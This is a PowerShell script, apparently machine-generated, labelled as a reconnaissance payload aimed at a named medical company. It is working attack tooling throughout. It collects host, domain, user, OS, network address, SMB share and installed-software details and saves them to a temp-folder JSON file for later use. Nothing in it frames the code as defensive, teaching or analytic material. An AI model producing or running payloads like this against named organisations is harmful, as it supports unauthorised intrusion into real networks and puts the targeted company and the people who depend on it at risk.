
# PowerShell Reconnaissance Payload for 3M Medical
# Generated: 2025-11-03T11:02:43.603565

function Get-SystemInfo {
    $systemInfo = @{
        Hostname = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Username = $env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -eq "Ethernet" -or $_.InterfaceAlias -eq "Wi-Fi"}).IPAddress
        MACAddress = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
    }
    return $systemInfo
}

function Get-NetworkShares {
    return Get-SmbShare | Select-Object Name, Path, Description
}

function Get-InstalledSoftware {
    return Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor
}

# Execute reconnaissance
$reconData = @{
    SystemInfo = Get-SystemInfo
    NetworkShares = Get-NetworkShares
    InstalledSoftware = Get-InstalledSoftware
}

# Convert to JSON and save to temp file
$reconData | ConvertTo-Json -Depth 3 | Out-File "$env:TEMP\3m_medical_recon.json"

Write-Host "Reconnaissance completed for 3M Medical"
